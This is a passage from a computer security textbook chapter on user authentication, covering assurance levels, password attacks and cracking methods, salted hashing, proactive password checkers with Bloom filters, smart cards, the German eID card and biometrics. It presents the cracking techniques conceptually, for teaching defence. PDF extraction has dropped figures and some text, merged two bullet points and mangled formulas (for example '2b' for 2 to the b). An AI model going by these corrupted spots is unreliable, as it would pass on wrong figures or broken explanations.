independently prior to any action). At this level, some sort of secure authenti-
cation protocol needs to be used, together with one of the means of authenti-
cation summarized previously and discussed in subsequent sections.
 
• Level 3: High confidence in the asserted identity’s validity. This level is appro-
[Word Count: 75]

priate to enable clients or employees to access restricted services of high value 
but not the highest value. An example for which this level is appropriate:  
A patent attorney electronically submits confidential patent information to 
the U.S. Patent and Trademark Office. Improper disclosure would give com-
petitors a competitive advantage. Techniques that would need to be used at 
this level require more than one factor of authentication; that is, at least two 
independent authentication techniques must be used.
 
• Level 4: Very high confidence in the asserted identity’s validity. This level is
[Word Count: 92]

appropriate to enable clients or employees to access restricted services of very 
high value or for which improper access is very harmful. For example, a law 
enforcement official accesses a law enforcement database containing criminal 
records. Unauthorized access could raise privacy issues and/or compromise 
investigations. Typically, level 4 authentication requires the use of multiple 
factors as well as in-person registration.
[Word Count: 60]

Potential Impact  A concept closely related to that of assurance level is potential 
impact. FIPS 199 (Standards for Security Categorization of Federal Information and 
Information Systems, 2004) defines three levels of potential impact on organizations 
or individuals should there be a breach of security (in our context, a failure in user 
authentication):
[Word Count: 52]

• Low: An authentication error could be expected to have a limited adverse
[Word Count: 13]

effect on organizational operations, organizational assets, or individuals. More 
specifically, we can say that the error might: (1) cause a degradation in mission
[Word Count: 23]

3.1 / Electronic User Authentication Principles   77
[Word Count: 7]

capability to an extent and duration that the organization is able to perform its 
primary functions, but the effectiveness of the functions is noticeably reduced; 
(2) result in minor damage to organizational assets; (3) result in minor financial 
loss to the organization or individuals; or (4) result in minor harm to individuals.
 
• Moderate: An authentication error could be expected to have a serious
[Word Count: 64]

adverse effect. More specifically, the error might: (1) cause a significant degra-
dation in mission capability to an extent and duration that the organization is 
able to perform its primary functions, but the effectiveness of the functions is 
significantly reduced; (2) result in significant damage to organizational assets; 
(3) result in significant financial loss; or (4) result in significant harm to indi-
viduals that does not involve loss of life or serious life threatening injuries.
 
• High: An authentication error could be expected to have a severe or cata-
[Word Count: 89]

strophic adverse effect. The error might: (1) cause a severe degradation in or 
loss of mission capability to an extent and duration that the organization is not 
able to perform one or more of its primary functions; (2) result in major dam-
age to organizational assets; (3) result in major financial loss to the organiza-
tion or individuals; or (4) result in severe or catastrophic harm to individuals 
involving loss of life or serious life threatening injuries.
[Word Count: 77]

Areas of Risk  The mapping between the potential impact and the appropriate 
level of assurance that is satisfactory to deal with the potential impact depends on the 
context. Table 3.1 shows a possible mapping for various risks that an organization 
may be exposed to. This table suggests a technique for doing risk assessment. For 
a given information system or service asset of an organization, the organization 
needs to determine the level of impact if an authentication failure occurs, using the 
categories of impact, or risk areas, that are of concern.
[Word Count: 90]

For example, consider the potential for financial loss if there is an authenti-
cation error that results in unauthorized access to a database. Depending on the 
nature of the database, the impact could be:
[Word Count: 34]

• Low: At worst, an insignificant or inconsequential unrecoverable financial
[Word Count: 10]

loss to any party, or at worst, an insignificant or inconsequential organization 
liability.
[Word Count: 13]

Table 3.1  Maximum Potential Impacts for Each Assurance Level
[Word Count: 9]

Potential Impact Categories for Authentication Errors
1
2
3
4
[Word Count: 10]

Inconvenience, distress, or damage to standing or reputation
Low
Mod
Mod
High
[Word Count: 12]

Financial loss or organization liability
Low
Mod
Mod
High
[Word Count: 9]

Harm to organization programs or interests
None
Low
Mod
High
[Word Count: 10]

Unauthorized release of sensitive information
None
Low
Mod
High
[Word Count: 9]

Civil or criminal violations
None
Low
Mod
High
[Word Count: 8]

• Moderate: At worst, a serious unrecoverable financial loss to any party, or a
[Word Count: 14]

serious organization liability.
 
• High: severe or catastrophic unrecoverable financial loss to any party; or se-
[Word Count: 16]

vere or catastrophic organization liability.
[Word Count: 5]

A widely used line of defense against intruders is the password system. Virtually all 
multiuser systems, network-based servers, Web-based e-commerce sites, and other 
similar services require that a user provide not only a name or identifier (ID) but 
also a password. The system compares the password to a previously stored pass-
word for that user ID, maintained in a system password file. The password serves 
to ­authenticate the ID of the individual logging on to the system. In turn, the ID 
provides security in the following ways:
[Word Count: 87]

•	 The ID determines whether the user is authorized to gain access to a system.
[Word Count: 15]

In some systems, only those who already have an ID filed on the system are 
­allowed to gain access.
	
• The ID determines the privileges accorded to the user. A few users may have
[Word Count: 34]

supervisory or “superuser” status that enables them to read files and perform 
functions that are especially protected by the operating system. Some systems 
have guest or anonymous accounts, and users of these accounts have more 
­limited privileges than others.
	
• The ID is used in what is referred to as discretionary access control. For exam-
[Word Count: 55]

ple, by listing the IDs of the other users, a user may grant permission to them 
to read files owned by that user.
[Word Count: 23]

In this subsection, we outline the main forms of attack against password-based 
­authentication and briefly outline a countermeasure strategy. The remainder of 
Section 3.2 goes into more detail on the key countermeasures.
[Word Count: 32]

Typically, a system that uses password-based authentication maintains a 
­password file indexed by user ID. One technique that is typically used is to store 
not the user’s password but a one-way hash function of the password, as described 
­subsequently.
[Word Count: 39]

3.2 / Password-Based Authentication   79
[Word Count: 5]

We can identify the following attack strategies and countermeasures:
[Word Count: 9]

•	 Offline dictionary attack:  Typically, strong access controls are used to pro-
[Word Count: 12]

tect the system’s password file. However, experience shows that determined 
hackers can frequently bypass such controls and gain access to the file. The 
attacker obtains the system password file and compares the password hashes 
against hashes of commonly used passwords. If a match is found, the ­attacker 
can gain access by that ID/password combination. Countermeasures include 
controls to prevent unauthorized access to the password file, intrusion detec-
tion measures to identify a compromise, and rapid reissuance of passwords 
should the password file be compromised.
	
• Specific account attack:  The attacker targets a specific account and submits
[Word Count: 96]

password guesses until the correct password is discovered. The standard coun-
termeasure is an account lockout mechanism, which locks out access to the 
account after a number of failed login attempts. Typical practice is no more 
than five access attempts.
	
• Popular password attack:  A variation of the preceding attack is to use a popu-
[Word Count: 55]

lar password and try it against a wide range of user IDs. A user’s tendency 
is to choose a password that is easily remembered; this unfortunately makes 
the password easy to guess. Countermeasures include policies to inhibit the 
­selection by users of common passwords and scanning the IP addresses of 
­authentication requests and client cookies for submission patterns.
	
• Password guessing against single user:  The attacker attempts to gain knowl-
[Word Count: 70]

edge about the account holder and system password policies and uses that 
knowledge to guess the password. Countermeasures include training in and 
enforcement of password policies that make passwords difficult to guess. 
Such policies address the secrecy, minimum length of the password, character 
set, prohibition against using well-known user identifiers, and length of time 
before the password must be changed.
	
• Workstation hijacking:  The attacker waits until a logged-in workstation is
[Word Count: 71]

unattended. The standard countermeasure is automatically logging the work-
station out after a period of inactivity. Intrusion detection schemes can be 
used to detect changes in user behavior.
	
• Exploiting user mistakes:  If the system assigns a password, then the user is
[Word Count: 42]

­effective or damaging if different network devices share the same or a similar
[Word Count: 13]

password for a given user. Countermeasures include a policy that forbids the 
same or ­similar password on particular network devices.
	
• Electronic monitoring:  If a password is communicated across a network to
[Word Count: 32]

log on to a remote system, it is vulnerable to eavesdropping. Simple encryp-
tion will not fix this problem, because the encrypted password is, in effect, the 
password and can be observed and reused by an adversary.
[Word Count: 37]

Despite the many security vulnerabilities of passwords, they remain the most 
commonly used user authentication technique, and this is unlikely to change in the 
foreseeable future [HERL12]. Among the reasons for the persistent popularity of 
passwords are the following:
[Word Count: 39]

1.	 Techniques the utilize client-side hardware, such as fingerprint scanners and
[Word Count: 11]

smart card readers, require the implementation of the appropriate user au-
thentication software to exploit this hardware on both the client and server 
systems. Until there is widespread acceptance on one side, there is reluctance 
to implement on the other side, so we end up with a who-goes-first stalemate.
	
2.	 Physical tokens, such as smart cards, are expensive and/or inconvenient to
[Word Count: 61]

carry around, especially if multiple tokens are needed.
	
3.	 Schemes that rely on a single sign-on to multiple services, using one of the
[Word Count: 23]

non-password techniques described in this chapter, create a single point of 
security risk.
	
4.	 Automated password managers that relieve users of the burden of knowing
[Word Count: 25]

and entering passwords have poor support for roaming and synchronization 
across multiple client platforms, and their usability had not be adequately 
researched.
[Word Count: 22]

Thus, it is worth our while to study the use of passwords for user authentica-
tion in some detail.
[Word Count: 19]

When a user attempts to log on to a UNIX system, the user provides an ID 
and a password (Figure 3.2b). The operating system uses the ID to index into the
[Word Count: 31]

3.2 / Password-Based Authentication   81
[Word Count: 5]

password file and retrieve the plaintext salt and the encrypted password. The salt 
and user-supplied password are used as input to the encryption routine. If the result 
matches the stored value, the password is accepted.
[Word Count: 35]

• It prevents duplicate passwords from being visible in the password file. Even if
[Word Count: 14]

two users choose the same password, those passwords will be assigned different 
salt values. Hence, the hashed passwords of the two users will differ.
[Word Count: 24]

• It greatly increases the difficulty of offline dictionary attacks. For a salt of
[Word Count: 14]

length b bits, the number of possible passwords is increased by a factor of 2b, 
increasing the difficulty of guessing a password in a dictionary attack.
	
• It becomes nearly impossible to find out whether a person with passwords on
[Word Count: 40]

two or more systems has used the same password on all of them.
[Word Count: 13]

There are two threats to the UNIX password scheme. First, a user can gain 
­access on a machine using a guest account or by some other means and then run 
a password guessing program, called a password cracker, on that machine. The 
attacker should be able to check many thousands of possible passwords with little 
resource consumption. In addition, if an opponent is able to obtain a copy of the 
password file, then a cracker program can be run on another machine at leisure. This 
enables the opponent to run through millions of possible passwords in a reasonable 
period.
[Word Count: 99]

This particular implementation is now considered woefully inadequate. For 
­example, [PERR03] reports the results of a dictionary attack using a supercomputer. 
The attack was able to process over 50 million password guesses in about 80 minutes. 
Further, the results showed that for about $10,000 anyone should be able to do the 
same in a few months using one uniprocessor machine. Despite its known weaknesses, 
this UNIX scheme is still often required for compatibility with existing ­account man-
agement software or in multivendor environments.
[Word Count: 83]

There are other, much stronger, hash/salt schemes available for UNIX. 
The recommended hash function for many UNIX systems, including Linux, 
Solaris, and FreeBSD (a widely used open source UNIX), is based on the MD5 
secure hash algorithm (which is similar to, but not as secure as SHA-1). The
[Word Count: 48]

3.2 / Password-Based Authentication   83
[Word Count: 5]

MD5 crypt routine uses a salt of up to 48 bits and effectively has no ­limitations 
on password length. It produces a 128-bit hash value. It is also far slower than 
crypt(3). To achieve the slowdown, MD5 crypt uses an inner loop with 1000 
iterations.
[Word Count: 45]

Password Cracking of User-Chosen Passwords
[Word Count: 5]

Traditional Approaches  The traditional approach to password guessing, 
or password cracking as it is called, is to develop a large dictionary of possible 
passwords and to try each of these against the password file. This means that each 
password must be hashed using each available salt value and then compared with 
stored hash values. If no match is found, the cracking program tries variations 
on all the words in its dictionary of likely passwords. Such variations include 
backwards spelling of words, additional numbers or special characters, or sequence 
of characters.
[Word Count: 90]

Password length is only part of the problem. Many people, when permit-
ted to choose their own password, pick a password that is guessable, such as their 
own name, their street name, a common dictionary word, and so forth. This makes 
the job of password cracking straightforward. The cracker simply has to test the
[Word Count: 54]

password file against lists of likely passwords. Because many people use guessable 
passwords, such a strategy should succeed on virtually all systems.
[Word Count: 22]

One demonstration of the effectiveness of guessing is reported in [KLEI90]. 
From a variety of sources, the author collected UNIX password files, containing 
nearly 14,000 encrypted passwords. The result, which the author rightly character-
izes as frightening, was that in all, nearly one-fourth of the passwords were guessed. 
The following strategy was used:
[Word Count: 53]

1.	 Try the user’s name, initials, account name, and other relevant personal infor-
[Word Count: 13]

mation. In all, 130 different permutations for each user were tried.
	
2.	 Try words from various dictionaries. The author compiled a dictionary of over
[Word Count: 24]

60,000 words, including the online dictionary on the system itself, and various 
other lists as shown.
	
3.	 Try various permutations on the words from step 2. This included making the
[Word Count: 30]

first letter uppercase or a control character, making the entire word upper-
case, reversing the word, changing the letter “o” to the digit “zero,” and so on. 
These permutations added another 1 million words to the list.
	
4.	 Try various capitalization permutations on the words from step 2 that were not
[Word Count: 51]

considered in step 3. This added almost 2 million additional words to the list.
[Word Count: 14]

Thus, the test involved nearly 3 million words. Using the fastest processor avail-
able, the time to encrypt all these words for all possible salt values was under an 
hour. Keep in mind that such a thorough search could produce a success rate of 
about 25%, whereas even a single hit may be enough to gain a wide range of privi-
leges on a system.
[Word Count: 65]

Attacks that use a combination of brute-force and dictionary techniques have 
become common. A notable example of this dual approach is John the Ripper, an 
open-source password cracker first developed in 1996 and still in use [OPEN13].
[Word Count: 37]

The second area of improvement in password cracking is in the use of sophisti-
cated algorithms to generate potential passwords. For example, [NARA05] developed 
a model for password generation using the probabilities of letters in natural language. 
The researchers used standard Markov modeling techniques from natural language 
processing to dramatically reduce the size of the password space to be searched.
[Word Count: 60]

3.2 / Password-Based Authentication   85
[Word Count: 5]

Using large datasets of leaked passwords as training data, [WEIR09] reports 
on the development of a probabilistic context-free grammar for password crack-
ing. In this approach, guesses are ordered according to their likelihood, based on 
the frequency of their character-class structures in the training data, as well as the 
frequency of their digit and symbol substrings. This approach has been shown to be 
efficient in password cracking [KELL12, ZHAN10].
[Word Count: 69]

Figure 3.3  The Percentage of Passwords Guessed After a Given Number of Guesses
[Word Count: 13]

One way to thwart a password attack is to deny the opponent access to the pass-
word file. If the hashed password portion of the file is accessible only by a privileged 
user, then the opponent cannot read it without already knowing the password of a 
privileged user. Often, the hashed passwords are kept in a separate file from the user 
IDs, referred to as a shadow password file. Special attention is paid to making the 
shadow password file protected from unauthorized access. Although password file 
protection is certainly worthwhile, there remain vulnerabilities:
[Word Count: 93]

• Many systems, including most UNIX systems, are susceptible to unanticipated
[Word Count: 11]

break-ins. A hacker may be able to exploit a software vulnerability in the 
­operating system to bypass the access control system long enough to extract 
the password file. Alternatively, the hacker may find a weakness in the file 
system or database management system that allows access to the file.
	
• An accident of protection might render the password file readable, thus com-
[Word Count: 62]

promising all the accounts.
	
• Some of the users have accounts on other machines in other protection
[Word Count: 17]

­domains, and they use the same password. Thus, if the passwords could 
be read by anyone on one machine, a machine in another location might be 
compromised.
	
• A lack of or weakness in physical security may provide opportunities for a
[Word Count: 41]

hacker. Sometimes there is a backup to the password file on an emergency 
­repair disk or archival disk. Access to this backup enables the attacker to read 
the password file. Alternatively, a user may boot from a disk running another 
operating system such as Linux and access the file from this OS.
	
• Instead of capturing the system password file, another approach to collecting
[Word Count: 64]

user IDs and passwords is through sniffing network traffic.
[Word Count: 9]

Thus, a password protection policy must complement access control measures with 
techniques to force users to select passwords that are difficult to guess.
[Word Count: 23]

• Computer-generated passwords
	
• Reactive password checking
	
• Complex password policy
[Word Count: 11]

3.2 / Password-Based Authentication   87
[Word Count: 5]

Users can be told the importance of using hard-to-guess passwords and can 
be provided with guidelines for selecting strong passwords. This user education 
­strategy is unlikely to succeed at most installations, particularly where there is a large 
user population or a lot of turnover. Many users will simply ignore the guidelines. 
Others may not be good judges of what is a strong password. For example, many 
users ­(mistakenly) believe that reversing a word or capitalizing the last letter makes 
a password unguessable.
[Word Count: 82]

A promising approach to improved password security is a complex password 
policy, or proactive password checker. In this scheme, a user is allowed to select his 
or her own password. How­ever, at the time of selection, the system checks to see if 
the password is allowable and, if not, rejects it. Such checkers are based on the phi-
losophy that, with sufficient guidance from the system, users can select memorable 
passwords from a fairly large password space that are not likely to be guessed in a 
dictionary attack.
[Word Count: 88]

The trick with a proactive password checker is to strike a balance between 
user acceptability and strength. If the system rejects too many passwords, users will 
complain that it is too hard to select a password. If the system uses some simple 
­algorithm to define what is acceptable, this provides guidance to password crackers
[Word Count: 54]

to refine their guessing technique. In the remainder of this subsection, we look at 
possible approaches to proactive password checking.
[Word Count: 20]

Rule Enforcement  The first approach is a simple system for rule enforcement. 
For example, the following rules could be enforced:
[Word Count: 20]

• All passwords must be at least eight characters long.
	
• In the first eight characters, the passwords must include at least one each of
[Word Count: 25]

uppercase, lowercase, numeric digits, and punctuation marks.
[Word Count: 7]

These rules could be coupled with advice to the user. Although this approach is 
­superior to simply educating users, it may not be sufficient to thwart password 
crackers. This scheme alerts crackers as to which passwords not to try but may still 
make it possible to do password cracking.
[Word Count: 49]

The process of rule enforcement can be automated by using a proactive pass-
word checker, such as the openware pam_passwdqc (openwall.com/passwdqc/), 
which enforces a variety of rules on passwords and is configurable by the system 
administrator.
[Word Count: 36]

Password Checker  Another possible procedure is simply to compile a large 
dictionary of possible “bad” passwords. When a user selects a password, the system 
checks to make sure that it is not on the disapproved list. There are two problems 
with this approach:
[Word Count: 43]

•	 Space:  The dictionary must be very large to be effective. For example, the
[Word Count: 14]

­dictionary used in the Purdue study [SPAF92a] occupies more than 30 MB of 
storage.
	
•	 Time:  The time required to search a large dictionary may itself be large. In
[Word Count: 29]

addition, to check for likely permutations of dictionary words, either those 
words must be included in the dictionary, making it truly huge, or each search 
must also involve considerable processing.
[Word Count: 30]

Bloom Filter  A technique [SPAF92a, SPAF92b] for developing an effective 
and efficient proactive password checker that is based on rejecting words on a list 
has been implemented on a number of systems, including Linux. It is based on the 
use of a Bloom filter [BLOO70]. To begin, we explain the operation of the Bloom 
filter. A Bloom filter of order k consists of a set of k independent hash functions 
H1(x), H2(x), c, Hk(x),  where each function maps a password into a hash value in 
the range 0 to N – 1. That is,
[Word Count: 94]

Hi(Xj) = y   1 … i … k;  1 … j … D;   0 … y … N - 1
[Word Count: 20]

Xj = jth word in password dictionary
D = number of words in password dictionary
[Word Count: 15]

3.2 / Password-Based Authentication   89
[Word Count: 5]

The following procedure is then applied to the dictionary:
[Word Count: 9]

1.	 A hash table of N bits is defined, with all bits initially set to 0.
	
2.	 For each password, its k hash values are calculated, and the corresponding bits in
[Word Count: 31]

the hash table are set to 1. Thus, if Hi  (Xj) = 67 for some (i, j), then the sixty-­seventh 
bit of the hash table is set to 1; if the bit already has the value 1, it remains at 1.
[Word Count: 41]

When a new password is presented to the checker, its k hash values are 
­calculated. If all the corresponding bits of the hash table are equal to 1, then the 
password is rejected. All passwords in the dictionary will be rejected. But there will 
also be some “false positives” (that is, passwords that are not in the dictionary but 
that produce a match in the hash table). To see this, consider a scheme with two 
hash functions. Suppose that the passwords undertaker and hulkhogan are in the 
dictionary, but xG%# jj98 is not. Further suppose that
[Word Count: 96]

H1(undertaker) = 25	
H1 (hulkhogan) = 83	
H1 (xG%#jj98) = 665
H2(undertaker) = 998 	
H2 (hulkhogan) = 665 	
H2 (xG%#jj98) = 998
[Word Count: 22]

If the password xG%#jj98 is presented to the system, it will be rejected even 
though it is not in the dictionary. If there are too many such false positives, it will be 
difficult for users to select passwords. Therefore, we would like to design the hash 
scheme to minimize false positives. It can be shown that the probability P of a false 
positive can be approximated by
[Word Count: 67]

k = number of hash functions
	
	
N = number of bits in hash table
	
	
D = number of words in dictionary
	
	
R = N/D, ratio of hash table size (bits) to dictionary size (words)
[Word Count: 34]

2The Bloom filter involves the use of probabilistic techniques. There is a small probability that some 
passwords not in the dictionary will be rejected. It is often the case in designing algorithms that the use of 
probabilistic techniques results in a less time-consuming or less complex solution, or both.
[Word Count: 49]

Objects that a user possesses for the purpose of user authentication are called 
­tokens. In this section, we examine two types of tokens that are widely used; these 
are cards that have the appearance and size of bank cards (see Table 3.2).
[Word Count: 42]

Memory cards can store but not process data. The most common such card is the bank 
card with a magnetic stripe on the back. A magnetic stripe can store only a ­simple 
­security code, which can be read (and unfortunately reprogrammed) by an inexpensive 
card reader. There are also memory cards that include an internal electronic memory.
[Word Count: 57]

Ratio of hash table size (bits) to dictionary size (words)
[Word Count: 10]

Figure 3.4    Performance of Bloom Filter
[Word Count: 6]

Table 3.2    Types of Cards Used as Tokens
[Word Count: 8]

Embossed 
Raised characters only, on front 
Old credit card
[Word Count: 9]

Magnetic stripe 
Magnetic bar on back, characters on front 
Bank card
[Word Count: 11]

Memory 
Electronic memory inside 
Prepaid phone card
[Word Count: 7]

Smart 
Electronic memory and processor inside 
Biometric ID card
[Word Count: 9]

Contact 
  Electrical contacts exposed on surface 
 
  Contactless 
  Radio antenna embedded inside
[Word Count: 11]

Memory cards can be used alone for physical access, such as a hotel room. For 
authentication, a user provides both the memory card and some form of password 
or personal identification number (PIN). A typical application is an automatic teller 
machine (ATM). The memory card, when combined with a PIN or password, pro-
vides significantly greater security than a password alone. An adversary must gain 
physical possession of the card (or be able to duplicate it) plus must gain knowledge 
of the PIN. Among the potential drawbacks are the following [NIST95]:
[Word Count: 91]

• Requires special reader: This increases the cost of using the token and creates
[Word Count: 14]

the requirement to maintain the security of the reader’s hardware and software.
	
• Token loss: A lost token temporarily prevents its owner from gaining ­system
[Word Count: 25]

access. Thus there is an administrative cost in replacing the lost token. In addi-
tion, if the token is found, stolen, or forged, then an adversary now need only 
determine the PIN to gain unauthorized access.
	
• User dissatisfaction: Although users may have no difficulty in accepting the
[Word Count: 48]

use of a memory card for ATM access, its use for computer access may be 
deemed inconvenient.
[Word Count: 17]

A wide variety of devices qualify as smart tokens. These can be categorized along 
four dimensions that are not mutually exclusive:
[Word Count: 21]

• Physical characteristics: Smart tokens include an embedded microprocessor.
[Word Count: 9]

A smart token that looks like a bank card is called a smart card. Other smart 
tokens can look like calculators, keys, or other small portable objects.
 
• User interface: Manual interfaces include a keypad and display for human/
[Word Count: 39]

token interaction.
 
• Electronic interface: A smart card or other token requires an electronic inter-
[Word Count: 15]

face to communicate with a compatible reader/writer. A card may have one or 
both of the following types of interface:
[Word Count: 20]

—	Contact: A contact smart card must be inserted into a smart card reader
[Word Count: 14]

with a direct connection to a conductive contact plate on the surface of the 
card (typically gold plated). Transmission of commands, data, and card sta-
tus takes place over these physical contact points.
—Contactless: A contactless card requires only close proximity to a reader.
[Word Count: 44]

Both the reader and the card have an antenna, and the two communicate 
using radio frequencies. Most contactless cards also derive power for the 
internal chip from this electromagnetic signal. The range is typically one-
half to three inches for non-battery-powered cards, ideal for applications 
such as building entry and payment that require a very fast card interface.
	
• Authentication protocol: The purpose of a smart token is to provide a means
[Word Count: 72]

for user authentication. We can classify the authentication protocols used with 
smart tokens into three categories:
[Word Count: 16]

—	Static: With a static protocol, the user authenticates himself or herself to the
[Word Count: 14]

token and then the token authenticates the user to the computer. The latter 
half of this protocol is similar to the operation of a memory token.
[Word Count: 26]

—	Dynamic password generator: In this case, the token generates a unique
[Word Count: 12]

password periodically (e.g., every minute). This password is then ­entered 
into the computer system for authentication, either manually by the user or 
electronically via the token. The token and the computer system must be 
initialized and kept synchronized so that the computer knows the password 
that is current for this token.
—	Challenge-response: In this case, the computer system generates a chal-
[Word Count: 62]

lenge, such as a random string of numbers. The smart token generates a 
­response based on the challenge. For example, public-key cryptography 
could be used and the token could encrypt the challenge string with the 
token’s private key.
[Word Count: 38]

For user authentication the most important category of smart token is the 
smart card, which has the appearance of a credit card, has an electronic interface, 
and may use any of the type of protocols just described. The remainder of this 
­section discusses smart cards.
[Word Count: 45]

A smart card contains within it an entire microprocessor, including processor, 
memory, and I/O ports. Some versions incorporate a special co-processing circuit for 
cryptographic operation to speed the task of encoding and decoding messages or gen-
erating digital signatures to validate the information transferred. In some cards, the 
I/O ports are directly accessible by a compatible reader by means of ­exposed electrical 
contacts. Other cards rely instead on an embedded antenna for wireless communica-
tion with the reader.
[Word Count: 78]

A typical smart card includes three types of memory. Read-only memory 
(ROM) stores data that does not change during the card’s life, such as the card 
­number and the cardholder’s name. Electrically erasable programmable ROM 
(EEPROM) holds application data and programs, such as the protocols that the 
card can execute. It also holds data that may vary with time. For example, in a 
­telephone card, the EEPROM holds the talk time remaining. Random access 
memory (RAM) holds temporary data generated when applications are ­executed.
[Word Count: 84]

An application of increasing importance is the use of a smart card as a national iden-
tity card for citizens. A national electronic identity (eID) card can serve the same pur-
poses as other national ID cards, and similar cards such as a driver’s license, for access 
to government and commercial services. In addition, an eID card can provide stronger 
proof of identity and be used in a wider variety of applications. In effect, an eID card is 
a smart card that has been verified by the national government as valid and authentic.
[Word Count: 93]

One of the most recent and most advanced eID deployments is the German 
eID card neuer Personalausweis [POLL12]. The card has human-readable data 
printed on its surface, including the following:
[Word Count: 30]

• Personal data: Such as name, date of birth, and address; this is the type of
[Word Count: 16]

printed information found on passports and driver’s licenses.
 
• Document number: An alphanumerical nine-character unique identifier of
[Word Count: 17]

each card.
 
• Card access number (CAN): A six-digit decimal random number printed on
[Word Count: 14]

the face of the card. This is used as a password, as explained subsequently.
 
• Machine readable zone (MRZ): Three lines of human- and machine-readable
[Word Count: 25]

text on the back of the card. This may also be used as a password.
[Word Count: 15]

Eid Functions  The card has the following three separate electronic functions, 
each with its own protected dataset (Table 3.3):
[Word Count: 19]

• ePass: This function is reserved for government use and stores a digital rep-
[Word Count: 14]

resentation of the cardholder’s identity. This function is similar to, and may 
be used for, an electronic passport. Other government services may also use 
ePass. The ePass function must be implemented on the card.
 
• eID: This function is for general-purpose use in a variety of government and
[Word Count: 48]

commercial applications. The eID function stores an identity record that
[Word Count: 10]

APDU = Application protocol data unit
ATR  = Answer to reset
PTS  = Protocol type selection
[Word Count: 16]

Figure 3.5    Smart Card/Reader Exchange
[Word Count: 5]

authorized service can access with cardholder permission. Citizens choose 
whether they want this function activated.
 
• eSign: This optional function stores a private key and a certificate verifying the
[Word Count: 29]

key; it is used for generating a digital signature. A private sector trust center 
issues the certificate.
[Word Count: 17]

The ePass function is an offline function. That is, it is not used over a network 
but is used in a situation where the cardholder presents the card for a particular 
service at that location, such as going through a passport control checkpoint.
[Word Count: 43]

The eID function can be used for both online and offline services. An example 
of an offline use is an inspection system. An inspection system is a terminal for law 
enforcement checks, for example, by police or border control officers. An inspec-
tion system can read identifying information of the cardholder as well as biometric 
information stored on the card, such as facial image and fingerprints. The biometric 
information can be used to verify that the individual in possession of the card is the 
actual cardholder.
[Word Count: 86]

User authentication is a good example of online use of the eID function. 
Figure 3.6 illustrates a Web-based scenario. To begin, an eID user visits a Web 
site and requests a service that requires authentication. The Web site sends back
[Word Count: 40]

Table 3.3  Electronic Functions and Data for eID Cards
[Word Count: 9]

Function
Purpose
PACE Password
Data
Uses
[Word Count: 6]

Authorized offline 
inspection systems 
read the data
[Word Count: 7]

Face image; two 
fingerprint images 
(optional); MRZ 
data
[Word Count: 8]

Offline biometric 
identity verifica-
tion reserved  
for government 
access
[Word Count: 9]

Online applica-
tions read the data 
or access functions 
as authorized
[Word Count: 11]

Family and given 
names; artistic 
name and doctoral 
degree: date and 
place of birth; 
address and  
community ID; 
expiration date
[Word Count: 20]

Identification; age 
verification; com-
munity ID verifi-
cation; restricted 
identification 
(pseudonym); 
revocation query
[Word Count: 13]

Offline inspection 
systems read the 
data and update 
the address and 
community ID
[Word Count: 13]

A certification 
authority installs 
the signature  
certificate  
online
[Word Count: 8]

Citizens make elec-
tronic signature 
with eSign PIN
[Word Count: 8]

CAN = card access number
MRZ = machine readable zone
PACE = password authenticated connection establishment
PIN = personal identification number
[Word Count: 21]

a redirect message that forwards an authentication request to an eID server. The 
eID server requests that the user enter the PIN number for the eID card. Once the 
user has correctly entered the PIN, data can be exchanged between the eID card 
and the terminal reader in encrypted form. The server then engages in an authen-
tication protocol exchange with the microprocessor on the eID card. If the user is 
authenticated the results are sent back to the user system to be redirected to the 
Web server application.
[Word Count: 89]

For the preceding scenario, the appropriate software and hardware are 
required on the user system. Software on the main user system includes function-
ality for requesting and accepting the PIN number and for message ­redirection. 
The hardware required is an eID card reader. The card reader can be an external 
contact or contactless reader or a contactless reader internal to the user system.
[Word Count: 63]

Password Authenticated Connection Establishment (PACE)  Password 
Authenticated Connection Establishment (PACE) ensures that the contactless 
RF chip in the eID card cannot be read without explicit access control. For online 
applications, access to the card is established by the user entering the 6-digit PIN, 
which should only be known to the holder of the card. For offline applications, 
either the MRZ printed on the back of the card or the six-digit card access number 
(CAN) printed on the front is used.
[Word Count: 80]

1. User requests service
(e.g., via Web browser)
[Word Count: 8]

Figure 3.6  User Authentication with eID
[Word Count: 6]

A biometric authentication system attempts to authenticate an individual based on 
his or her unique physical characteristics. These include static characteristics, such 
as fingerprints, hand geometry, facial characteristics, and retinal and iris ­patterns; 
and ­dynamic characteristics, such as voiceprint and signature. In essence, biomet-
rics is based on pattern recognition. Compared to passwords and tokens, biometric 
­authentication is both technically more complex and expensive. While it is used in 
a ­number of specific applications, biometrics has yet to mature as a standard tool 
for user ­authentication to computer systems.
[Word Count: 89]

Physical Characteristics Used in Biometric Applications
[Word Count: 6]

A number of different types of physical characteristics are either in use or under 
study for user authentication. The most common are the following:
[Word Count: 24]

• Facial characteristics:  Facial characteristics are the most common means
[Word Count: 10]

of ­human-to-human identification; thus it is natural to consider them for 
­identification by computer. The most common approach is to define charac-
teristics based on relative location and shape of key facial features, such as 
eyes, ­eyebrows, nose, lips, and chin shape. An alternative approach is to use an 
­infrared camera to produce a face thermogram that correlates with the under-
lying vascular system in the human face.
	
• Fingerprints:  Fingerprints have been used as a means of identification for
[Word Count: 80]

­centuries, and the process has been systematized and automated particu-
larly for law enforcement purposes. A fingerprint is the pattern of ridges and 
­furrows on the surface of the fingertip. Fingerprints are believed to be unique 
across the entire human population. In practice, automated fingerprint recog-
nition and matching system extract a number of features from the fingerprint 
for storage as a numerical surrogate for the full fingerprint pattern.
	
• Hand geometry: Hand geometry systems identify features of the hand,
[Word Count: 80]

­including shape, and lengths and widths of fingers.
	
• Retinal pattern: The pattern formed by veins beneath the retinal surface is
[Word Count: 21]

unique and therefore suitable for identification. A retinal biometric system 
obtains a digital image of the retinal pattern by projecting a low-intensity 
beam of visual or infrared light into the eye.
	
• Iris: Another unique physical characteristic is the detailed structure of the iris.
	
• Signature: Each individual has a unique style of handwriting and this is
[Word Count: 57]

­reflected especially in the signature, which is typically a frequently written 
­sequence. However, multiple signature samples from a single individual will 
not be ­identical. This complicates the task of developing a computer represen-
tation of the signature that can be matched to future samples.
	
• Voice:  Whereas the signature style of an individual reflects not only the unique
[Word Count: 58]

physical attributes of the writer but also the writing habit that has ­developed, 
voice patterns are more closely tied to the physical and anatomical characteris-
[Word Count: 25]

tics of the speaker. Nevertheless, there is still a variation from ­sample to sample 
over time from the same speaker, complicating the biometric recognition task.
[Word Count: 25]

Figure 3.7 gives a rough indication of the relative cost and accuracy of these 
­biometric measures. The concept of accuracy does not apply to user authentication 
schemes using smart cards or passwords. For example, if a user enters a password, 
it ­either matches exactly the password expected for that user or not. In the case of 
­biometric parameters, the system instead must determine how closely a presented bio-
metric characteristic matches a stored characteristic. Before elaborating on the concept 
